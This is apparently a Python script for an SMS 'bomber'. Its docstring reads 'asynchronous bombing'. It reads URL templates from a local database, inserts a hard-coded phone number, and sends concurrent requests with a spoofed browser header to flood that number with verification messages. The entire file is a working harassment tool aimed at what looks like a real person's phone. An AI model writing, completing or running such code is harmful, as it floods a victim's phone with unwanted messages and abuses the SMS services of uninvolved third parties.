#!/usr/bin/python python3
# coding=utf-8
'''
Author: whalefall
Date: 2021-08-07 21:23:35
LastEditTime: 2021-08-09 19:12:32
Description: 异步轰炸
'''
import asyncio
import aiohttp
from utils.db_sqlite import Sql

header = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36",
}


async def get(url, session: aiohttp.ClientSession):
    '''异步请求'''
    print(f"开始请求{url}")
    async with session.get(url, headers=header) as resp:
        status = await resp.text()
        print(status)


async def main():
    urls = Sql().select()
    tasks = []
    async with aiohttp.ClientSession() as session:
        for url in urls:
            url = url.replace("{phone}", "19820294268")
            task = asyncio.create_task(get(url, session))
            tasks.append(task)
        await asyncio.wait(tasks)

if __name__ == "__main__":
    asyncio.run(main())
